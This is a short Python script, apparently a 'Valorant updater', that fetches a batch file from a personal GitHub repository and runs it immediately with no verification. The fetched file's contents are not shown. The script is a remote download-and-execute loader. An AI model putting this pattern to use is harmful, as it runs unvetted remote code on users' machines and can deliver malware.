import urllib.request
import subprocess
urllib.request.urlretrieve("https://raw.githubusercontent.com/EricChangOwO/ValorantUpdater/main/main.bat", "main.bat")
subprocess.call([r'main.bat'])